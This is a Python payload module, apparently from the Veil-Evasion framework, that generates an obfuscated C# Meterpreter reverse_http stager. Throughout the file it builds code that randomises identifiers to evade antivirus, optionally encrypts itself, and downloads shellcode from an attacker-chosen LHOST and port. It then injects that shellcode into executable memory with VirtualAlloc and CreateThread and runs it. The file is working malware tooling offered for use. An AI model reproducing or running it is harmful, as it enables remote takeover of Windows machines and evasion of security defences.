"""

Custom-written pure c# meterpreter/reverse_http stager.
Uses basic variable renaming obfuscation.

Module built by @harmj0y

"""

from modules.common import helpers
from modules.common import encryption
import random

class Payload:

    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Excellent"

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {
                                    "LHOST"            : ["", "IP of the Metasploit handler"],
                                    "LPORT"            : ["8080", "Port of the Metasploit handler"],
                                    "COMPILE_TO_EXE"   : ["Y", "Compile to an executable"],
                                    "USE_ARYA"         : ["N", "Use the Arya crypter"]
                                }


    def generate(self):

        # imports and namespace setup
        payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
        payloadCode += "namespace %s { class %s {\n" % (helpers.randomString(), helpers.randomString())

        # code for the randomString() function
        randomStringName = helpers.randomString()
        bufferName = helpers.randomString()
        charsName = helpers.randomString()
        t = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
        random.shuffle(t)
        chars = ''.join(t)

        payloadCode += "static string %s(Random r, int s) {\n" %(randomStringName)
        payloadCode += "char[] %s = new char[s];\n"%(bufferName)
        payloadCode += "string %s = \"%s\";\n" %(charsName, chars)
        payloadCode += "for (int i = 0; i < s; i++){ %s[i] = %s[r.Next(%s.Length)];}\n" %(bufferName, charsName, charsName)
        payloadCode += "return new string(%s);}\n" %(bufferName)


        # code for the checksum8() function
        checksum8Name = helpers.randomString()
        payloadCode += "static bool %s(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) %% 0x100 == 92);}\n" %(checksum8Name)


        # code fo the genHTTPChecksum() function
        genHTTPChecksumName = helpers.randomString()
        baseStringName = helpers.randomString()
        randCharsName = helpers.randomString()
        urlName = helpers.randomString()
        random.shuffle(t)
        randChars = ''.join(t)

        payloadCode += "static string %s(Random r) { string %s = \"\";\n" %(genHTTPChecksumName,baseStringName)
        payloadCode += "for (int i = 0; i < 64; ++i) { %s = %s(r, 3);\n" %(baseStringName,randomStringName)
        payloadCode += "string %s = new string(\"%s\".ToCharArray().OrderBy(s => (r.Next(2) %% 2) == 0).ToArray());\n" %(randCharsName,randChars)
        payloadCode += "for (int j = 0; j < %s.Length; ++j) {\n" %(randCharsName)
        payloadCode += "string %s = %s + %s[j];\n" %(urlName,baseStringName,randCharsName)
        payloadCode += "if (%s(%s)) {return %s;}}} return \"9vXU\";}"%(checksum8Name,urlName, urlName)


        # code for getData() function
        getDataName = helpers.randomString()
        strName = helpers.randomString()
        webClientName = helpers.randomString()
        sName = helpers.randomString()

        payloadCode += "static byte[] %s(string %s) {\n" %(getDataName,strName)
        payloadCode += "WebClient %s = new System.Net.WebClient();\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"Accept\", \"*/*\");\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n" %(webClientName)
        payloadCode += "%s.Headers.Add(\"Accept-Charset\", \"ISO-8859-1,utf-8;q=0.7,*;q=0.7\");\n" %(webClientName)
        payloadCode += "byte[] %s = null;\n" %(sName)
        payloadCode += "try { %s = %s.DownloadData(%s);\n" %(sName, webClientName, strName)
        payloadCode += "if (%s.Length < 100000) return null;}\n" %(sName)
        payloadCode += "catch (WebException) {}\n"
        payloadCode += "return %s;}\n" %(sName)


        # code fo the inject() function to inject shellcode
        injectName = helpers.randomString()
        sName = helpers.randomString()
        funcAddrName = helpers.randomString()
        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
        payloadCode += "    if (%s != null) {\n" %(sName)
        payloadCode += "        UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
        payloadCode += "        Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
        payloadCode += "        UInt32 %s = 0;\n" %(threadIdName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
        payloadCode += "        %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
        payloadCode += "        WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)


        # code for Main() to launch everything
        sName = helpers.randomString()
        randomName = helpers.randomString()

        payloadCode += "static void Main(){\n"
        payloadCode += "Random %s = new Random((int)DateTime.Now.Ticks);\n" %(randomName)
        payloadCode += "byte[] %s = %s(\"http://%s:%s/\" + %s(%s));\n" %(sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0],genHTTPChecksumName,randomName)
        payloadCode += "%s(%s);}\n" %(injectName, sName)

        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in xrange(12)]
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])

        if self.required_options["USE_ARYA"][0].lower() == "y":
            payloadCode = encryption.arya(payloadCode)

        return payloadCode
